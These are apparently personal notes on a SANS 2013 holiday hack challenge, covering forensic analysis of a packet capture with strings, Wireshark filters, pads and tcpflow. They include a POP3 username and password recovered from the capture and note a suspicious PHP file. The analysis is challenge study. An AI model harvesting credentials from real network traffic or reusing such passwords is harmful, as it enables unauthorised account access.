sans 2103 christmas challange

ran strings over the pcap to find anything interesting
	strings sansholidayhack2013.pcap >strings.txt
interestingly checking for meterpreter found some shell instances
	strings sansholidayhack2013.pcap |grep -A5 -i meterpr |less


wiresharking the pcap - interesting filters

	dns.flags == 0x8180
finds all dns responses
	pop
gives all pop3 traffic including usernames/passwords
	username/password dsawyer/Fashionista

following stream of pop traffic provides link to PLC controller:

used pads to find ip address'. operating systems and ports being used -
produced assets.txt
	pads -r sansholidayhack2013.pcap

IPs i'd like to have another look at
10.2.2.2 - port 8081 looks like proxy
10.22.11.9

10.22.11.9:80
	tmpurykq.php


apache 2.2.14
mod

tcpflow -
make seperate directory extracts all the tcp streams as files

 tcpflow -r ../sansholidayhack2013.pcap

wireshark filter for smb
then export/objects/smb found an exe
